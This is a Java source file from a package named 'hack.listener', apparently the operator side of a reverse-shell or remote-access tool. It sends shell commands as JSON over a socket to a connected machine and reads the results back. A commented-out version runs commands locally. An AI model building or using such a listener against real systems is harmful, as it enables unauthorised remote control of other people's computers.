package com.hack.listener;

import com.google.gson.Gson;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;



public class CommandSend {
    
    private final Socket socket;
    private final String command;
    
    public CommandSend(Socket socket, String command) {
        this.socket = socket;
        this.command = command;
    }
    
    public void jsonSend(Object data) throws IOException {
        Gson gson = new Gson();
        String jsonData = gson.toJson(data);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(jsonData.getBytes("UTF-8"));
        outputStream.flush();
    }

    public Object commandExecution() throws IOException {
        List<String> commandInput = new ArrayList<>();

        // Komutu boşluklara göre böler ve elde edilen parçaları ArrayList'e ekler
        commandInput.addAll(Arrays.asList(command.split(" ")));

        // ArrayList'i diziye dönüştürür
        String[] commandArray = commandInput.toArray(String[]::new);

        // Komutu gönderir ve cevabı alır
        jsonSend(commandArray);
        try {
            return GetOutput.jsonRecv(socket);
        } catch (IOException e) {
            ErrorDialog.showError("Hata olustu");
            System.out.println(e);
            return null;
        }
    }
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    /*
    private Socket socket;
    private final String command;
    
    public CommandSend(Socket socket, String command) {
        this.socket = socket;
        this.command = command;
    }
    
    public String send(){
        try{
            Process process = Runtime.getRuntime().exec(command);
            InputStream inputStream = process.getInputStream();
            InputStreamReader inputStreamReader = new InputStreamReader(inputStream, StandardCharsets.UTF_8);
            BufferedReader reader = new BufferedReader(inputStreamReader);
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            return output.toString();
        }
        catch(IOException e){
            return "Error executing command: " + e.getMessage();
        }
    }
    */
    
}
